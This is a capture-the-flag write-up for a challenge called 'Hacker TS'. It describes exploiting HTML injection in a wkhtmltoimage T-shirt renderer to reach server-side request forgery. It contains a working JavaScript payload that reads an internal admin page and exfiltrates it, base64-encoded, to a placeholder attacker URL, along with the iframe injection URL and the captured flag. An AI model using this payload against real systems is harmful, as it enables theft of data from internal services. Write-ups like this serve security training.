# Hacker TS

We have some kind of image renderer that places our text onto a T-Shirt image. After some fuzzing, we would find that HTML injection is possible.

![](<../../.gitbook/assets/image (86).png>)

If we try to load an external resource (e.g. JavaScript or stylesheet), we can capture the request made by the server, and see that the user agent is `wkhtmltoimage`.

It seems that SSRF vulnerabilities through `wkhtmltoimage` and `wkhtmltopdf` are pretty [well known](http://hassankhanyusufzai.com/SSRF-to-LFI/), so we could craft the following payload to exfiltrate the contents of `http://localhost:5000/admin`.

```markup
<html>
    <body>
        <script>
            function reqListener () {
                var exfil = new XMLHttpRequest();
                exfil.open("GET", "http://ATTACKER_URL/" + btoa(this.responseText), false);
                exfil.send();
            }

            var oReq = new XMLHttpRequest();
            oReq.addEventListener("load", reqListener);
            oReq.open("GET", "http://localhost:5000/admin");
            oReq.send();
        </script>
    </body>
</html>
```

We can then host the above and load it through an iframe:

`http://challenge.nahamcon.com:32132/exploit?text=%3Ciframe%20src=%22https://ATTACKER_URL/exploit.html%22%3E&color=%2324d600`

The contents of the admin page contains the flag:

```markup
<!-- Page Content -->
<div class="container">
  <div class="alert alert-success mt-5">
    Hi admin! here is your flag:
    <strong>flag{461e2452088eb397b6138a5934af6231}</strong>
  </div>
</div>
<!-- /.container -->
```
